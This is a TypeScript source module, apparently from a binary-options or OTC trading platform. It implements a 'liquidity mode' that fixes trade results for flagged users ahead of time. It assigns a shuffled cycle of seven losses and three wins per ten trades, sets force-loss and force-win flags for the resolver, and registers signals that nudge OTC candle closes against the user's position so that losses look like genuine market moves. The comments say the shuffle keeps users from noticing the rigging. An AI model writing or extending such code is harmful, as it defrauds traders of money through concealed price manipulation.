// Per-op liquidity manipulation state — in-memory only.
//
// Used by the User.liquidityMode flow ("modo liquidez") to coordinate
// between createOperation (where the 70% roll happens) and either:
//   - resolveOperation (Binance assets — force-loss in the resolver,
//     same "silent" behaviour as before)
//   - the OTC tick loop (OTC assets — register a signal that pulls the
//     close in the opposite direction, so the user loses on a coherent
//     vela vermelha, not a "vela verde mas perdeu" mismatch).
//
// Design choices:
//  - State is in-memory: Map<opId, true> and Map<assetId, signal[]>.
//    Lost on restart — fail-safe is "resolve naturally", which is the
//    same outcome the system had before any of this existed.
//  - 70% roll happens ONCE per op (at create), not at resolve. Same op
//    can never re-roll partway through; signal + forced-loss flag are
//    paired by opId.
//  - Auto-cleanup on resolve + periodic GC for orphans (op never
//    resolved for some reason → entry sits forever otherwise).
//  - Strict opt-in: every public function returns falsy/empty by
//    default. NO real user without an explicit admin
//    User.liquidityMode = true ever touches this code path.

export interface LiquiditySignal {
  opId:         string
  assetId:      string
  // The DIRECTION WE WANT THE CANDLE TO CLOSE. If user opened CALL we
  // want the candle to close DOWN, so direction = 'PUT' here. The OTC
  // tick loop reads this same direction key the admin signals use.
  direction:    'CALL' | 'PUT'
  // Slot end-time ms epoch — the M1 (60s) slot containing the op's
  // expiresAt. Manipulation tick loop only nudges in the last
  // NUDGE_WINDOW_MS of this slot.
  slotEndMs:    number
  expiresAtMs:  number
}

// ── Per-op force-loss flag (used by resolveOperation) ───────────────────
// Set at op-create time when the cycle slot picks "lose". Read at resolve
// time by the worker. NOT a re-roll — pre-decided outcome.
const forceLossOpIds = new Set<string>()

export function markOpForcedLoss(opId: string): void {
  forceLossOpIds.add(opId)
}

export function isOpForcedLoss(opId: string): boolean {
  return forceLossOpIds.has(opId)
}

export function clearOpForcedLoss(opId: string): void {
  forceLossOpIds.delete(opId)
}

// ── Per-op force-WIN flag (mirror of force-loss) ────────────────────────
// Set at op-create time when the cycle slot picks "win" for a liquidity
// user. Read by resolveOperation: forcedWin = isFake || isOpForcedWin.
// Keeps the worker logic symmetric with force-loss.
const forceWinOpIds = new Set<string>()

export function markOpForcedWin(opId: string): void {
  forceWinOpIds.add(opId)
}

export function isOpForcedWin(opId: string): boolean {
  return forceWinOpIds.has(opId)
}

export function clearOpForcedWin(opId: string): void {
  forceWinOpIds.delete(opId)
}

// ── Per-user liquidity cycle (deterministic 7 loss + 3 win shuffle) ─────
// Each user with liquidityMode=true gets a shuffled queue of CYCLE_SIZE
// outcomes (7 'LOSS' + 3 'WIN'). Each createOperation call consumes one
// outcome. When the queue empties, a fresh shuffle is generated.
//
// Replaces the previous Math.random() < 0.7 per-op roll. With independent
// rolls the user could see 10 losses in a row by chance; with the cycle
// the user sees EXACTLY 7L+3W per 10 ops, but the position of the 3 wins
// inside the cycle is unpredictable (Fisher-Yates shuffle).
//
// In-memory only — same fail-safe as the rest of this module (a restart
// just starts a new cycle, no historical drift). The set per user is tiny
// (~10 entries) so memory is negligible even with thousands of liquidity
// users.

const CYCLE_SIZE       = 10
const CYCLE_LOSS_COUNT = 7
const CYCLE_WIN_COUNT  = 3   // CYCLE_SIZE - CYCLE_LOSS_COUNT, kept explicit for readability

export type LiquidityOutcome = 'LOSS' | 'WIN'

const cycleQueueByUser = new Map<string, LiquidityOutcome[]>()

// Fisher-Yates in-place shuffle. Deterministic positions otherwise would
// make the wins predictable to the user (e.g. always positions 8/9/10).
function shuffleInPlace<T>(arr: T[]): void {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1))
    ;[arr[i], arr[j]] = [arr[j], arr[i]]
  }
}

function newShuffledCycle(): LiquidityOutcome[] {
  const out: LiquidityOutcome[] = []
  for (let i = 0; i < CYCLE_LOSS_COUNT; i++) out.push('LOSS')
  for (let i = 0; i < CYCLE_WIN_COUNT;  i++) out.push('WIN')
  shuffleInPlace(out)
  return out
}

/**
 * Consumes the next outcome from this user's liquidity cycle. Auto-creates
 * (and shuffles) a fresh cycle when the previous one is exhausted. Pure
 * O(1) amortized — the shuffle runs once per CYCLE_SIZE calls.
 */
export function getNextLiquidityOutcome(userId: string): LiquidityOutcome {
  let queue = cycleQueueByUser.get(userId)
  if (!queue || queue.length === 0) {
    queue = newShuffledCycle()
    cycleQueueByUser.set(userId, queue)
  }
  // shift() is O(n) but n=10 so cost is constant — keeping the readable
  // FIFO semantics instead of micro-optimizing with an index cursor.
  return queue.shift()!
}

/** Diagnostic helper — peek at the user's remaining cycle without consuming. */
export function peekLiquidityCycle(userId: string): LiquidityOutcome[] {
  return [...(cycleQueueByUser.get(userId) ?? [])]
}

/** Admin reset hook — drops the user's cycle so the next op starts fresh. */
export function resetLiquidityCycle(userId: string): void {
  cycleQueueByUser.delete(userId)
}

// ── Per-asset liquidity signals (used by OTC tick loop) ─────────────────
// Bucket by assetId so the per-tick lookup is O(signalsForThisAsset),
// matching the admin-signal cache shape in otc/v2/runtime/manipulation.ts.
const liquiditySignalsByAsset = new Map<string, LiquiditySignal[]>()

export function registerLiquiditySignal(s: LiquiditySignal): void {
  const arr = liquiditySignalsByAsset.get(s.assetId) ?? []
  arr.push(s)
  // Keep sorted by slotEndMs ASC so consumers can early-exit when
  // scanning for the slot they care about.
  arr.sort((a, b) => a.slotEndMs - b.slotEndMs)
  liquiditySignalsByAsset.set(s.assetId, arr)
}

export function getLiquiditySignalsForAsset(assetId: string): LiquiditySignal[] {
  return liquiditySignalsByAsset.get(assetId) ?? []
}

export function clearLiquiditySignalsForOp(opId: string): void {
  for (const [assetId, arr] of liquiditySignalsByAsset) {
    const filtered = arr.filter((s) => s.opId !== opId)
    if (filtered.length === 0) liquiditySignalsByAsset.delete(assetId)
    else                       liquiditySignalsByAsset.set(assetId, filtered)
  }
}

// ── GC — runs every 5 min, drops anything older than 1 hour ─────────────
// Catches orphans: ops that never resolved (worker crashed mid-resolve,
// admin canceled out-of-band, etc.). 1h is comfortably longer than the
// max op duration (900s) so a "still pending" op never gets GC'd by
// mistake.
const GC_INTERVAL_MS = 5 * 60_000
const MAX_SIGNAL_AGE_MS = 60 * 60_000

let gcTimer: ReturnType<typeof setInterval> | null = null

export function startLiquidityGc(): void {
  if (gcTimer) return
  gcTimer = setInterval(() => {
    const cutoff = Date.now() - MAX_SIGNAL_AGE_MS
    let dropped = 0
    for (const [assetId, arr] of liquiditySignalsByAsset) {
      const fresh = arr.filter((s) => s.expiresAtMs > cutoff)
      if (fresh.length === arr.length) continue
      dropped += arr.length - fresh.length
      if (fresh.length === 0) liquiditySignalsByAsset.delete(assetId)
      else                    liquiditySignalsByAsset.set(assetId, fresh)
    }
    // forceLoss/forceWin Sets have no timestamp — capped via the same op
    // cleanup path called from resolveOperation. GC for those would
    // require tracking insertion time per id; the sets are small (1
    // entry per pending op, ~minutes lifetime) so the cost of NOT GC-ing
    // them is negligible vs the complexity.
    // cycleQueueByUser is also untouched — each user has at most
    // CYCLE_SIZE=10 entries and the map only grows by unique liquidity
    // users (bounded by admin opt-ins).
    if (dropped > 0) console.log(`[liquidity] gc dropped ${dropped} stale signals`)
  }, GC_INTERVAL_MS)
}

export function stopLiquidityGc(): void {
  if (gcTimer) {
    clearInterval(gcTimer)
    gcTimer = null
  }
}
